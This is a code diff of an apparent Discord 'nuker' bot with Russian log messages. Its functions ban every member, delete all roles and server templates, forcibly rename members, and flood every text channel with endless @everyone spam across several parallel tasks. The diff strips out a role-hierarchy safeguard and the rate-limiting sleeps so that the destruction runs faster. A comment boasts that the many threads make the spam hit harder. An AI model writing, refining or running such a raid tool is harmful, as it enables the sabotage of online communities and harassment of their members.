@@ -25,7 +25,6 @@ client = commands.Bot(command_prefix='$', intents=intents )
 
 
 async def banall(ctx):
-    author = ctx.message.author
     print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
     ban = 0
     bany = 0
@@ -66,15 +65,12 @@ async def chistrl(ctx):
     roles = ctx.guild.roles
     roles.pop(0)
     for role in roles:
-        if ctx.guild.me.roles[-1] > role:
-            try:
-                await role.delete()
-                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
-            except:
-                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
-                continue
-        else:
-            break
+        try:
+            await role.delete()
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
+        except:
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
+            continue
     print(f"{Fore.WHITE}> {Fore.RED}Почистил{Fore.WHITE}.")
     
 async def masks(ctx):
@@ -84,7 +80,7 @@ async def masks(ctx):
         try:
             await member.edit(nick=nickname)
             print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}]{member}, Поиграем в маскарад? Твоя маска {nickname}")
-        except Exception as e:
+        except:
             continue
     print(f"{Fore.WHITE}> {Fore.RED}Все теперь анонизмусы{Fore.WHITE}.")
 
@@ -116,11 +112,9 @@ async def chisttemp(ctx):
     try:
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Чистим шаблоны")
         bebrus = await ctx.guild.templates()
-        await asyncio.sleep(2)
         for template in bebrus:
             print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Шаблон почистил!")
             await template.delete()
-            await asyncio.sleep(2)
         print(f"{Fore.WHITE}> {Fore.RED}Все шаблоны почистились!{Fore.WHITE}.")
     except:
         pass
@@ -175,45 +169,15 @@ async def start(ctx):
   roles = ctx.guild.roles
   roles.pop(0)
   for role in roles:
-      if ctx.guild.me.roles[-1] > role:
-           try:
-                await role.delete()
-                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
-           except:
-                print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
-                continue
-      else:
-          break
+        try:
+            await role.delete()
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Удалил {role}")
+        except:
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Не удалил {role}")
+            continue
   print(f"{Fore.WHITE}> {Fore.RED}Почистил роли{Fore.WHITE}.")
 
-async def spamth1(ctx):
-    while True:
-        for channel in ctx.guild.text_channels:
-          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
-
-async def spamth2(ctx):
-    while True:
-        for channel in ctx.guild.text_channels:
-          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
-
-
-async def spamth3(ctx):
-    while True:
-        for channel in ctx.guild.text_channels:
-          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
-
-
-async def spamth4(ctx):
-    while True:
-        for channel in ctx.guild.text_channels:
-          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
-
-async def spamth5(ctx):
-    while True:
-        for channel in ctx.guild.text_channels:
-          await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
-
-async def spamth6(ctx):
+async def spamth(ctx):
     while True:
         for channel in ctx.guild.text_channels:
           await channel.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
@@ -221,12 +185,13 @@ async def spamth6(ctx):
 @client.command()
 async def ml(ctx):
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спам активирован")
-    asyncio.create_task(spamth1(ctx))
-    asyncio.create_task(spamth2(ctx))
-    asyncio.create_task(spamth3(ctx))
-    asyncio.create_task(spamth4(ctx))
-    asyncio.create_task(spamth5(ctx))
-    asyncio.create_task(spamth6(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx))
+    asyncio.create_task(spamth(ctx)) #Куча тредов чтобы жахало как надо
+    asyncio.create_task(spamth(ctx))
 
 @client.command()
 async def gamehelp(ctx):
